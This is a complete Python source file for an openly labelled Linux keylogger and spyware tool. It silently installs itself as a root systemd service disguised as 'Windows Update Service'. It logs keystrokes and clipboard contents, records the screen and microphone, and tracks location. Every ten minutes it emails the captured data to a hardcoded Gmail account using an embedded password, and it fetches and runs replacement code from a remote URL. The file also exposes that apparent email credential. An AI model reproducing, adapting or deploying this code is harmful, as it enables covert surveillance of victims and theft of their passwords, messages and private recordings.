#!/usr/bin/env python3
"""
POWERFUL LINUX KEYLOGGER - Complete Ultimate Version
Features: Keylogging, Screenshots, Screen Recording, Audio, Location, Clipboard, Auto-Update
Website: https://github.com/terminal123b/linuxupdateservice
"""

import os
import sys
import time
import threading
import datetime
import sqlite3
import json
import smtplib
import socket
import platform
import subprocess
import queue
import configparser
import hashlib
import tempfile
import shutil
import signal
from pathlib import Path

# ============================================================================
# IMPORTS WITH FALLBACK
# ============================================================================

try:
    from pynput import keyboard, mouse
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False

try:
    import evdev
    from evdev import InputDevice, categorize, ecodes
    HAS_EVDEV = True
except ImportError:
    HAS_EVDEV = False

try:
    import mss
    import mss.tools
    HAS_MSS = True
except ImportError:
    HAS_MSS = False

try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import cv2
    import numpy as np
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

try:
    import sounddevice as sd
    import soundfile as sf
    HAS_SOUNDDEVICE = True
except ImportError:
    HAS_SOUNDDEVICE = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import pyperclip
    HAS_PYPERCLIP = True
except ImportError:
    HAS_PYPERCLIP = False

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# ============================================================================
# CONFIGURATION
# ============================================================================

APP_NAME = "WindowsUpdateService"
INSTALL_DIR = "/opt/WindowsUpdateService"
CONFIG_DIR = "/etc/windowsupdateservice"
LOG_DIR = "/var/log/windowsupdateservice"
DATA_DIR = "/var/lib/windowsupdateservice"

CONFIG_FILE = os.path.join(CONFIG_DIR, 'config.ini')
DB_FILE = os.path.join(DATA_DIR, 'data.db')

# Create directories
for d in [INSTALL_DIR, CONFIG_DIR, LOG_DIR, DATA_DIR]:
    os.makedirs(d, exist_ok=True)

# ============================================================================
# GLOBAL VARIABLES
# ============================================================================

current_window = {'process': 'Unknown', 'title': 'Unknown'}
window_lock = threading.Lock()
keyboard_buffer = []
buffer_lock = threading.Lock()
is_running = True
log_queue = queue.Queue()
screenshot_counter = 0
VERSION = "2.0.0"

# ============================================================================
# SELF-INSTALLATION
# ============================================================================

def self_install():
    """Self-installation routine"""
    try:
        print("[INSTALLER] Performing silent self-installation...")
        
        # Create directories
        os.makedirs(INSTALL_DIR, exist_ok=True)
        os.makedirs(CONFIG_DIR, exist_ok=True)
        os.makedirs(LOG_DIR, exist_ok=True)
        os.makedirs(DATA_DIR, exist_ok=True)
        
        # Copy script
        current_script = os.path.abspath(sys.argv[0])
        dest_script = os.path.join(INSTALL_DIR, 'keylogger.py')
        
        if current_script != dest_script:
            shutil.copy2(current_script, dest_script)
            os.chmod(dest_script, 0o755)
        
        # Create config if not exists
        if not os.path.exists(CONFIG_FILE):
            config_content = """[Settings]
EmailUsername = terminal123b@gmail.com
EmailPassword = yuleohozhxxbajxx
EmailTo = terminal123b@gmail.com
SyncInterval = 600
MaxAttachments = 25

[Stealth]
HideProcess = true
RunOnStartup = true
ProcessName = systemd-logind

[Advanced]
ScreenshotsPerBatch = 10
ScreenshotBatchInterval = 600
ScreenRecordEnabled = true
ScreenRecordInterval = 120
ScreenRecordDuration = 30
AudioEnabled = true
AudioInterval = 120
AudioDuration = 30
LocationEnabled = true
LocationInterval = 300
MaxVideosPerEmail = 5
MaxAudioPerEmail = 10
ImageQuality = 70

[AutoUpdate]
Enabled = true
CheckOnStartup = true
CheckInterval = 86400
UpdateURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/keylogger.py
VersionURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/version.txt
"""
            with open(CONFIG_FILE, 'w') as f:
                f.write(config_content)
            os.chmod(CONFIG_FILE, 0o600)
        
        # Setup systemd service
        service_content = f"""[Unit]
Description=Windows Update Service
After=network.target sound.target graphical.target
Wants=network.target

[Service]
Type=simple
User=root
ExecStart={INSTALL_DIR}/venv/bin/python3 {INSTALL_DIR}/keylogger.py --hidden
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null
SyslogIdentifier=windowsupdateservice
Nice=19
IOSchedulingClass=idle

[Install]
WantedBy=multi-user.target
"""
        service_path = "/etc/systemd/system/windowsupdateservice.service"
        with open(service_path, 'w') as f:
            f.write(service_content)
        os.chmod(service_path, 0o644)
        
        # Enable and start service
        subprocess.run(['systemctl', 'daemon-reload'], capture_output=True)
        subprocess.run(['systemctl', 'enable', 'windowsupdateservice.service'], capture_output=True)
        subprocess.run(['systemctl', 'start', 'windowsupdateservice.service'], capture_output=True)
        
        print("[INSTALLER] Self-installation complete!")
        sys.exit(0)
        
    except Exception as e:
        print(f"[INSTALLER] Error: {e}")
        return False

# ============================================================================
# DATABASE
# ============================================================================

def init_database():
    """Initialize all database tables"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # Keystrokes table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            window_process TEXT,
            window_title TEXT,
            text TEXT NOT NULL,
            synced INTEGER DEFAULT 0
        )
    ''')
    
    # Screenshots table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            file_path TEXT NOT NULL,
            width INTEGER,
            height INTEGER,
            file_type TEXT DEFAULT 'screenshot',
            synced INTEGER DEFAULT 0
        )
    ''')
    
    # Audio recordings table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS audio (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            file_path TEXT NOT NULL,
            duration INTEGER,
            synced INTEGER DEFAULT 0
        )
    ''')
    
    # Screen recordings table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS screen_recordings (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            file_path TEXT NOT NULL,
            duration INTEGER,
            width INTEGER,
            height INTEGER,
            synced INTEGER DEFAULT 0
        )
    ''')
    
    # Clipboard table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS clipboard (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            content TEXT NOT NULL,
            synced INTEGER DEFAULT 0
        )
    ''')
    
    # System info table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS system_info (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            info_key TEXT NOT NULL,
            info_value TEXT
        )
    ''')
    
    conn.commit()
    conn.close()

# ============================================================================
# KEYBOARD HANDLING
# ============================================================================

class KeyboardHandler:
    """Advanced keyboard handler with multiple methods"""
    
    def __init__(self):
        self.devices = []
        self._setup_keyboard()
    
    def _setup_keyboard(self):
        """Setup keyboard capture"""
        if HAS_EVDEV:
            try:
                self._setup_evdev()
                return
            except:
                pass
        
        if HAS_PYNPUT:
            try:
                self._setup_pynput()
                return
            except:
                pass
        
        print("[ERROR] No keyboard input method available!")
    
    def _setup_evdev(self):
        """Setup evdev for keyboard capture"""
        try:
            devices = [InputDevice(path) for path in evdev.list_devices()]
            self.keyboards = [d for d in devices if 'keyboard' in d.name.lower()]
            
            if not self.keyboards:
                return
            
            for keyboard in self.keyboards:
                thread = threading.Thread(target=self._evdev_capture, args=(keyboard,))
                thread.daemon = True
                thread.start()
            
            print(f"[OK] evdev keyboard capture active ({len(self.keyboards)} devices)")
        except Exception as e:
            print(f"[ERROR] evdev setup: {e}")
    
    def _evdev_capture(self, keyboard):
        """Capture keystrokes via evdev"""
        try:
            keyboard.grab()
            for event in keyboard.read_loop():
                if not is_running:
                    break
                if event.type == ecodes.EV_KEY:
                    key_event = categorize(event)
                    if key_event.keystate == key_event.key_down:
                        self._handle_key(key_event.keycode)
        except:
            pass
    
    def _setup_pynput(self):
        """Setup pynput keyboard listener"""
        try:
            listener = keyboard.Listener(on_press=self._pynput_callback)
            listener.start()
            print("[OK] pynput keyboard capture active")
        except Exception as e:
            print(f"[ERROR] pynput setup: {e}")
    
    def _pynput_callback(self, key):
        """Handle pynput key events"""
        try:
            if hasattr(key, 'char') and key.char is not None:
                if key.char.isprintable():
                    self._handle_key(key.char)
            else:
                key_map = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n',
                    keyboard.Key.backspace: '[BKSP]',
                    keyboard.Key.tab: '\t',
                    keyboard.Key.esc: '[ESC]',
                    keyboard.Key.delete: '[DEL]',
                    keyboard.Key.shift: '[SHIFT]',
                    keyboard.Key.ctrl: '[CTRL]',
                    keyboard.Key.alt: '[ALT]',
                }
                if key in key_map:
                    self._handle_key(key_map[key])
        except:
            pass
    
    def _handle_key(self, key_char):
        """Process key press"""
        global keyboard_buffer, current_window
        
        try:
            if key_char == '[BKSP]':
                with buffer_lock:
                    if keyboard_buffer:
                        keyboard_buffer.pop()
            else:
                with buffer_lock:
                    keyboard_buffer.append(key_char)
            
            # Flush on sentence end or buffer full
            if key_char in ['\n', '.', '?', '!'] or len(keyboard_buffer) > 50:
                self._flush_buffer()
        except:
            pass
    
    def _flush_buffer(self):
        """Flush keyboard buffer to database"""
        global keyboard_buffer, current_window
        
        with buffer_lock:
            if not keyboard_buffer:
                return
            
            text = ''.join(keyboard_buffer)
            while '[BKSP]' in text:
                idx = text.find('[BKSP]')
                if idx > 0:
                    text = text[:idx-1] + text[idx+6:]
                else:
                    text = text[idx+6:]
            
            text = text.strip()
            if text:
                with window_lock:
                    window_info = current_window.copy()
                
                log_queue.put(('keystroke', {
                    'time': datetime.datetime.now().isoformat(),
                    'process': window_info['process'],
                    'title': window_info['title'],
                    'text': text
                }))
            
            keyboard_buffer = []

# ============================================================================
# SCREENSHOT FUNCTIONS
# ============================================================================

def capture_screenshot(quality=70):
    """Capture screenshot using mss"""
    global screenshot_counter
    
    if not HAS_MSS:
        return None
    
    try:
        screenshot_counter += 1
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}_{screenshot_counter}.png"
        filepath = os.path.join(LOG_DIR, filename)
        
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            
            if HAS_PIL:
                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                img.save(filepath, optimize=True, quality=quality)
            else:
                mss.tools.to_png(screenshot.rgb, screenshot.size, output=filepath)
        
        # Store in database
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO screenshots (timestamp, file_path, width, height, file_type, synced) VALUES (?, ?, ?, ?, ?, ?)",
            (datetime.datetime.now().isoformat(), filepath, screenshot.width, screenshot.height, 'screenshot', 0)
        )
        conn.commit()
        conn.close()
        
        print(f"[OK] Screenshot: {filename}")
        return filepath
        
    except Exception as e:
        print(f"[ERROR] Screenshot: {e}")
        return None

def screenshot_batch_scheduler():
    """Take 10 screenshots every 10 minutes"""
    while is_running:
        print("[INFO] Starting screenshot batch (10 screenshots)")
        for i in range(10):
            if not is_running:
                break
            capture_screenshot()
            if i < 9:
                time.sleep(60)
        time.sleep(60)

# ============================================================================
# SCREEN RECORDING
# ============================================================================

def record_screen(duration=30, fps=5):
    """Record screen with audio"""
    if not HAS_CV2 or not HAS_MSS:
        return None
    
    try:
        print(f"[INFO] Recording screen ({duration}s)...")
        
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            width, height = monitor['width'], monitor['height']
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screen_record_{timestamp}.mp4"
        filepath = os.path.join(LOG_DIR, filename)
        
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(filepath, fourcc, fps, (width, height))
        
        start_time = time.time()
        frame_count = 0
        
        while (time.time() - start_time) < duration and is_running:
            with mss.mss() as sct:
                screenshot = sct.grab(sct.monitors[1])
                frame = np.array(screenshot)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                out.write(frame)
                frame_count += 1
                time.sleep(1.0 / fps)
        
        out.release()
        
        if frame_count > 0:
            size_mb = get_file_size_mb(filepath)
            print(f"[OK] Recording: {filename} ({size_mb:.2f} MB, {frame_count} frames)")
            
            conn = sqlite3.connect(DB_FILE)
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO screen_recordings (timestamp, file_path, duration, width, height, synced) VALUES (?, ?, ?, ?, ?, ?)",
                (datetime.datetime.now().isoformat(), filepath, duration, width, height, 0)
            )
            conn.commit()
            conn.close()
            
            return filepath
        
        return None
        
    except Exception as e:
        print(f"[ERROR] Screen recording: {e}")
        return None

def screen_record_scheduler():
    """Record screen every 2 minutes"""
    while is_running:
        time.sleep(120)
        if is_running:
            record_screen(duration=30, fps=5)

# ============================================================================
# AUDIO RECORDING
# ============================================================================

def record_audio(duration=30):
    """Record microphone audio"""
    if not HAS_SOUNDDEVICE:
        return None
    
    try:
        print(f"[INFO] Recording audio ({duration}s)...")
        SAMPLE_RATE = 22050
        
        audio_data = sd.rec(
            int(duration * SAMPLE_RATE),
            samplerate=SAMPLE_RATE,
            channels=1,
            dtype='float32'
        )
        sd.wait()
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"audio_{timestamp}.wav"
        filepath = os.path.join(LOG_DIR, filename)
        
        sf.write(filepath, audio_data, SAMPLE_RATE)
        
        size_mb = get_file_size_mb(filepath)
        print(f"[OK] Audio: {filename} ({size_mb:.2f} MB)")
        
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO audio (timestamp, file_path, duration, synced) VALUES (?, ?, ?, ?)",
            (datetime.datetime.now().isoformat(), filepath, duration, 0)
        )
        conn.commit()
        conn.close()
        
        return filepath
        
    except Exception as e:
        print(f"[ERROR] Audio: {e}")
        return None

def audio_scheduler():
    """Record audio every 2 minutes"""
    while is_running:
        time.sleep(120)
        if is_running:
            record_audio(30)

# ============================================================================
# CLIPBOARD MONITOR
# ============================================================================

def clipboard_monitor():
    """Monitor clipboard for changes"""
    if not HAS_PYPERCLIP:
        return
    
    last_content = ""
    while is_running:
        try:
            current_content = pyperclip.paste()
            if current_content and current_content != last_content:
                last_content = current_content
                log_queue.put(('clipboard', {
                    'time': datetime.datetime.now().isoformat(),
                    'content': current_content.strip()
                }))
                print(f"[OK] Clipboard: {current_content[:50]}...")
        except:
            pass
        time.sleep(2)

# ============================================================================
# LOCATION TRACKING
# ============================================================================

def get_location():
    """Get location from IP"""
    if not HAS_REQUESTS:
        return None
    
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                location = {
                    'ip': ip,
                    'lat': data.get('lat'),
                    'lng': data.get('lon'),
                    'city': data.get('city'),
                    'country': data.get('country'),
                    'region': data.get('regionName'),
                    'isp': data.get('isp')
                }
                
                conn = sqlite3.connect(DB_FILE)
                cursor = conn.cursor()
                cursor.execute(
                    "INSERT INTO system_info (timestamp, info_key, info_value) VALUES (?, ?, ?)",
                    (datetime.datetime.now().isoformat(), 'location', json.dumps(location))
                )
                conn.commit()
                conn.close()
                
                print(f"[OK] Location: {location.get('city')}, {location.get('country')}")
                return location
    except:
        pass
    return None

def location_scheduler():
    """Update location every 5 minutes"""
    while is_running:
        time.sleep(300)
        if is_running:
            get_location()

# ============================================================================
# SYSTEM INFORMATION
# ============================================================================

def collect_system_info():
    """Collect comprehensive system info"""
    info = {}
    info['computer_name'] = socket.gethostname()
    info['username'] = os.environ.get('USER', 'Unknown')
    info['os_version'] = platform.system() + " " + platform.release()
    info['kernel_version'] = platform.version()
    info['architecture'] = platform.machine()
    
    try:
        info['ip_address'] = socket.gethostbyname(socket.gethostname())
    except:
        info['ip_address'] = 'Unknown'
    
    if HAS_REQUESTS:
        try:
            info['public_ip'] = requests.get('https://api.ipify.org', timeout=5).text
        except:
            info['public_ip'] = 'Unknown'
    
    if HAS_PSUTIL:
        info['cpu_count'] = psutil.cpu_count()
        info['cpu_percent'] = psutil.cpu_percent()
        
        mem = psutil.virtual_memory()
        info['memory_total_gb'] = round(mem.total / (1024**3), 2)
        info['memory_available_gb'] = round(mem.available / (1024**3), 2)
        info['memory_used_gb'] = round((mem.total - mem.available) / (1024**3), 2)
        info['memory_percent'] = mem.percent
        
        disk = psutil.disk_usage('/')
        info['disk_total_gb'] = round(disk.total / (1024**3), 2)
        info['disk_free_gb'] = round(disk.free / (1024**3), 2)
        info['disk_used_gb'] = round(disk.used / (1024**3), 2)
        info['disk_percent'] = disk.percent
        
        # Network interfaces
        try:
            net = psutil.net_if_addrs()
            info['network_interfaces'] = len(net)
        except:
            pass
    
    # Store in database
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    for key, value in info.items():
        cursor.execute(
            "INSERT INTO system_info (timestamp, info_key, info_value) VALUES (?, ?, ?)",
            (datetime.datetime.now().isoformat(), key, str(value))
        )
    conn.commit()
    conn.close()
    
    return info

# ============================================================================
# FILE HELPERS
# ============================================================================

def get_file_size_mb(filepath):
    try:
        return os.path.getsize(filepath) / (1024 * 1024)
    except:
        return 0

def get_files_by_type(file_type, limit=10):
    """Get unsynced files by type"""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        if file_type == 'screenshot':
            cursor.execute("SELECT file_path FROM screenshots WHERE synced = 0 ORDER BY id DESC LIMIT ?", (limit,))
        elif file_type == 'audio':
            cursor.execute("SELECT file_path FROM audio WHERE synced = 0 ORDER BY id DESC LIMIT ?", (limit,))
        elif file_type == 'video':
            cursor.execute("SELECT file_path FROM screen_recordings WHERE synced = 0 ORDER BY id DESC LIMIT ?", (limit,))
        else:
            conn.close()
            return []
        
        rows = cursor.fetchall()
        conn.close()
        
        files = []
        for row in rows:
            path = row[0]
            if os.path.exists(path) and get_file_size_mb(path) < 20:
                files.append(path)
        
        return files
        
    except Exception as e:
        return []

# ============================================================================
# EMAIL SENDING
# ============================================================================

def get_config():
    """Get configuration"""
    config = configparser.ConfigParser()
    config.read(CONFIG_FILE)
    return {
        'email': config.get('Settings', 'EmailUsername', fallback='terminal123b@gmail.com'),
        'password': config.get('Settings', 'EmailPassword', fallback=''),
        'to': config.get('Settings', 'EmailTo', fallback='terminal123b@gmail.com')
    }

def send_email(subject, body, attachments=None):
    """Send email with attachments"""
    config = get_config()
    
    if not config['password']:
        print("[ERROR] Email password not configured!")
        return False
    
    try:
        msg = MIMEMultipart()
        msg['From'] = config['email']
        msg['To'] = config['to']
        msg['Subject'] = f"[Keylogger] {subject}"
        msg.attach(MIMEText(body, 'plain', 'utf-8'))
        
        attached_count = 0
        if attachments:
            for filepath in attachments[:25]:
                if os.path.exists(filepath) and get_file_size_mb(filepath) < 20:
                    try:
                        with open(filepath, 'rb') as f:
                            part = MIMEBase('application', 'octet-stream')
                            part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(filepath)}')
                        msg.attach(part)
                        attached_count += 1
                    except:
                        pass
        
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(config['email'], config['password'])
        server.send_message(msg)
        server.quit()
        
        print(f"[OK] Email sent: {subject} ({attached_count} attachments)")
        return True
        
    except Exception as e:
        print(f"[ERROR] Email: {e}")
        return False

def sync_data():
    """Sync data via email"""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        # Get unsynced data
        cursor.execute("SELECT * FROM keystrokes WHERE synced = 0 ORDER BY id DESC LIMIT 100")
        keystrokes = cursor.fetchall()
        
        cursor.execute("SELECT * FROM clipboard WHERE synced = 0 ORDER BY id DESC LIMIT 15")
        clipboards = cursor.fetchall()
        
        cursor.execute("SELECT info_key, info_value FROM system_info ORDER BY id DESC LIMIT 30")
        system_info = {row[0]: row[1] for row in cursor.fetchall()}
        
        # Get files
        screenshot_files = get_files_by_type('screenshot', 10)
        audio_files = get_files_by_type('audio', 10)
        video_files = get_files_by_type('video', 5)
        
        all_attachments = screenshot_files + audio_files + video_files
        
        if not keystrokes and not clipboards and not all_attachments:
            print("[INFO] No data to sync")
            conn.close()
            return
        
        print(f"[INFO] Syncing: {len(keystrokes)} keystrokes, {len(all_attachments)} files")
        
        # Build email body
        body = "=" * 70 + "\n"
        body += "POWERFUL KEYLOGGER REPORT\n"
        body += "=" * 70 + "\n"
        body += f"Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        body += f"Version: {VERSION}\n"
        body += "-" * 70 + "\n"
        body += "SYSTEM INFORMATION\n"
        body += "-" * 70 + "\n"
        body += f"  Computer: {system_info.get('computer_name', 'Unknown')}\n"
        body += f"  User: {system_info.get('username', 'Unknown')}\n"
        body += f"  OS: {system_info.get('os_version', 'Unknown')}\n"
        body += f"  Kernel: {system_info.get('kernel_version', 'Unknown')}\n"
        body += f"  Architecture: {system_info.get('architecture', 'Unknown')}\n"
        body += f"  IP: {system_info.get('ip_address', 'Unknown')}\n"
        body += f"  Public IP: {system_info.get('public_ip', 'Unknown')}\n"
        body += f"  CPU: {system_info.get('cpu_percent', 'Unknown')}%\n"
        body += f"  Memory: {system_info.get('memory_used_gb', 'Unknown')} GB / {system_info.get('memory_total_gb', 'Unknown')} GB\n"
        body += f"  Disk: {system_info.get('disk_used_gb', 'Unknown')} GB / {system_info.get('disk_total_gb', 'Unknown')} GB\n"
        
        if system_info.get('location'):
            try:
                loc = json.loads(system_info.get('location', '{}'))
                if loc and loc.get('city'):
                    body += f"  Location: {loc.get('city')}, {loc.get('country')}\n"
                    body += f"  Coordinates: {loc.get('lat')}, {loc.get('lng')}\n"
                    body += f"  ISP: {loc.get('isp', 'Unknown')}\n"
            except:
                pass
        
        body += "-" * 70 + "\n\n"
        body += "DATA STATISTICS\n"
        body += "-" * 40 + "\n"
        body += f"  Keystrokes: {len(keystrokes)}\n"
        body += f"  Clipboard: {len(clipboards)}\n"
        body += f"  Screenshots: {len(screenshot_files)} attached\n"
        body += f"  Audio: {len(audio_files)} attached\n"
        body += f"  Videos: {len(video_files)} attached\n"
        body += f"  Total: {len(all_attachments)} files attached\n"
        body += "-" * 40 + "\n\n"
        
        if keystrokes:
            body += "KEYSTROKES:\n"
            body += "-" * 40 + "\n"
            for row in keystrokes[:50]:
                body += f"  [{row[1]}] [{row[2]}] {row[4]}\n"
            body += "\n"
        
        if clipboards:
            body += "CLIPBOARD:\n"
            body += "-" * 40 + "\n"
            for row in clipboards[:10]:
                content = row[2][:100]
                body += f"  [{row[1]}] {content}...\n"
            body += "\n"
        
        body += "=" * 70
        body += f"\nLogs: {LOG_DIR}\n"
        body += "=" * 70
        
        # Send email
        if send_email(f"Keylogger Report - {len(all_attachments)} files", body, all_attachments):
            # Mark as synced
            if screenshot_files:
                placeholders = ','.join(['?' for _ in screenshot_files])
                cursor.execute(f"UPDATE screenshots SET synced = 1 WHERE file_path IN ({placeholders})", screenshot_files)
            if audio_files:
                placeholders = ','.join(['?' for _ in audio_files])
                cursor.execute(f"UPDATE audio SET synced = 1 WHERE file_path IN ({placeholders})", audio_files)
            if video_files:
                placeholders = ','.join(['?' for _ in video_files])
                cursor.execute(f"UPDATE screen_recordings SET synced = 1 WHERE file_path IN ({placeholders})", video_files)
            cursor.execute("UPDATE keystrokes SET synced = 1 WHERE synced = 0")
            cursor.execute("UPDATE clipboard SET synced = 1 WHERE synced = 0")
            conn.commit()
            print("[OK] Data marked as synced")
        
        conn.close()
        
    except Exception as e:
        print(f"[ERROR] Sync: {e}")

def sync_worker():
    """Sync every 10 minutes"""
    while is_running:
        try:
            sync_data()
        except:
            pass
        time.sleep(600)

# ============================================================================
# AUTO-UPDATE
# ============================================================================

class AutoUpdater:
    """Handle auto-updates"""
    
    def __init__(self):
        self.version_file = os.path.join(DATA_DIR, 'version.txt')
        self.current_version = self.get_current_version()
    
    def get_current_version(self):
        try:
            if os.path.exists(self.version_file):
                with open(self.version_file, 'r') as f:
                    return f.read().strip()
        except:
            pass
        return VERSION
    
    def check_for_updates(self):
        if not HAS_REQUESTS:
            return False
        
        try:
            config = configparser.ConfigParser()
            config.read(CONFIG_FILE)
            version_url = config.get('AutoUpdate', 'VersionURL', fallback='')
            
            if not version_url:
                return False
            
            response = requests.get(version_url, timeout=10)
            if response.status_code == 200:
                latest = response.text.strip()
                if latest != self.current_version:
                    print(f"[UPDATE] New version: {latest} (current: {self.current_version})")
                    return True
            return False
        except Exception as e:
            print(f"[UPDATE] Check error: {e}")
            return False
    
    def perform_update(self):
        if not HAS_REQUESTS:
            return False
        
        try:
            config = configparser.ConfigParser()
            config.read(CONFIG_FILE)
            update_url = config.get('AutoUpdate', 'UpdateURL', fallback='')
            
            if not update_url:
                return False
            
            print("[UPDATE] Downloading update...")
            response = requests.get(update_url, timeout=60)
            
            if response.status_code == 200:
                script_path = os.path.join(INSTALL_DIR, 'keylogger.py')
                
                # Backup current script
                backup_path = script_path + '.backup'
                if os.path.exists(script_path):
                    shutil.copy2(script_path, backup_path)
                
                # Write new script
                with open(script_path, 'w') as f:
                    f.write(response.text)
                os.chmod(script_path, 0o755)
                
                # Update version
                with open(self.version_file, 'w') as f:
                    f.write(self.current_version)
                
                print("[UPDATE] Update applied successfully")
                return True
            return False
        except Exception as e:
            print(f"[UPDATE] Error: {e}")
            return False

def update_worker():
    """Check for updates every 24 hours"""
    updater = AutoUpdater()
    time.sleep(300)  # Wait 5 minutes
    
    while is_running:
        try:
            if updater.check_for_updates():
                updater.perform_update()
        except:
            pass
        time.sleep(86400)  # 24 hours

# ============================================================================
# MAIN
# ============================================================================

def daemonize():
    """Daemonize the process"""
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except:
        pass
    
    os.setsid()
    os.umask(0)
    
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except:
        pass
    
    # Close file descriptors
    for fd in range(3, 1024):
        try:
            os.close(fd)
        except:
            pass

def main():
    """Main function"""
    global is_running
    
    # Check if we need to self-install
    if len(sys.argv) > 1 and sys.argv[1] == "--hidden":
        daemonize()
    else:
        # Check if installed
        installed_path = os.path.join(INSTALL_DIR, 'keylogger.py')
        if not os.path.exists(installed_path) or os.path.abspath(sys.argv[0]) != installed_path:
            self_install()
    
    # Initialize
    init_database()
    collect_system_info()
    get_location()
    
    print("=" * 70)
    print(" POWERFUL LINUX KEYLOGGER v" + VERSION)
    print("=" * 70)
    print(f" Logs: {LOG_DIR}")
    print(f" Data: {DATA_DIR}")
    print("=" * 70)
    print(" Features:")
    print("  ✅ Keylogging (all keystrokes)")
    print("  ✅ Screenshots (10 every 10 minutes)")
    print("  ✅ Screen Recording (30s every 2 minutes)")
    print("  ✅ Audio Recording (30s every 2 minutes)")
    print("  ✅ Clipboard Capture")
    print("  ✅ Location Tracking (every 5 minutes)")
    print("  ✅ System Information")
    print("  ✅ Email Reports (every 10 minutes)")
    print("  ✅ Auto-Update")
    print("  ✅ Stealth Mode")
    print("  ✅ Startup Persistence")
    print("=" * 70)
    
    # Start keyboard handler
    keyboard_handler = KeyboardHandler()
    
    # Start screenshot scheduler
    thread = threading.Thread(target=screenshot_batch_scheduler, daemon=True)
    thread.start()
    
    # Start screen recording
    if HAS_CV2:
        thread = threading.Thread(target=screen_record_scheduler, daemon=True)
        thread.start()
    
    # Start audio recording
    if HAS_SOUNDDEVICE:
        thread = threading.Thread(target=audio_scheduler, daemon=True)
        thread.start()
    
    # Start clipboard monitor
    if HAS_PYPERCLIP:
        thread = threading.Thread(target=clipboard_monitor, daemon=True)
        thread.start()
    
    # Start location tracking
    if HAS_REQUESTS:
        thread = threading.Thread(target=location_scheduler, daemon=True)
        thread.start()
    
    # Start sync worker
    thread = threading.Thread(target=sync_worker, daemon=True)
    thread.start()
    
    # Start auto-update
    config = configparser.ConfigParser()
    config.read(CONFIG_FILE)
    if config.getboolean('AutoUpdate', 'Enabled', fallback=True):
        thread = threading.Thread(target=update_worker, daemon=True)
        thread.start()
    
    print("\n[OK] Keylogger is running!\n")
    print("Press Ctrl+C to stop\n")
    
    try:
        while is_running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[INFO] Stopping...")
        is_running = False

if __name__ == "__main__":
    main()
